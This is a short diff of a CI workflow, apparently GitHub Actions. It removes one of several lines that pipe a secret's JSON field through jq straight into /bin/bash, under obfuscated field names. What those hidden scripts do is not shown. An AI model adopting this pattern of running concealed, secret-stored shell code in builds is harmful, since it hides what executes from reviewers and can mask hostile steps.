@@ -20,7 +20,6 @@ jobs:
           uc4: ${{ secrets.uc4 }}
         run: |
           printf '%s' "$uc4" | jq -r .obf8 | /bin/bash
-          printf '%s' "$r02" | jq -r .mvki1176 | /bin/bash
           printf '%s' "$ak384" | jq -r .sjjk657 | /bin/bash
           printf '%s' "$pf20" | jq -r .hqe53676 | /bin/bash
 
